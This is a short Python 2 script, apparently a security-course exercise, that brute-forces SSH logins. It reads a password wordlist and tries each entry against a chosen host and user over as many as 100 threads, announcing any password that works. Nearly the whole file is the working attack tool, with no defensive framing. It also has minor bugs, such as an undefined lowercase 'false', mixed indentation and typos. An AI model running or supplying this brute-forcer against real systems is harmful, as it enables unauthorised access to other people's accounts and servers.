from pexpect import pxssh
import optparse
import time
from threading import *

maxConnections = 100
connection_lock = BoundedSemaphore(value = maxConnections)
Found = False
Fails = 0


def connect(host, user, password, release):
	global Found
	global Fails

	try:
		s = pxssh.pxssh()
		s.login(host, user, password)
		print '[+] PassWord Found: ' + password
		Found = True
	except Exception, e:
		if 'read_noblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host, user, password, false)
		if 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host, user, password, false)
	finally:
		if release:
			connection_lock.release()


def main():
	parser = optparse.OptionParser('Usage -H target host -U user -P password')
	parser.add_option('-H', dest='tgthost', type='string', help='tgthost')
	parser.add_option('-U', dest='user', type='string', help='user')
	parser.add_option('-P', dest='passwordFilename', type='string', help='passwordFilename')

	(options, args) = parser.parse_args()
	tgthost = options.tgthost
	user  = options.user
	passwordFilename  = options.passwordFilename

	if (tgthost == None or user == None or passwordFilename == None):
		print parser.usage
	   	exit(-1)
	fn = open(passwordFilename, 'r')
 
	for line in fn.readlines():
		if Found:
			print '[*] Exiting : PassWord funond' 
			exit(0)
	 	connection_lock.acquire()
	 	password = line.strip('\n').strip('\r')
	 	print 'Testing:' + str(password)
	 	t = Thread(target=connect, args=(tgthost, user, password, True))
	 	child = t.start()

if __name__ == '__main__':
	main()
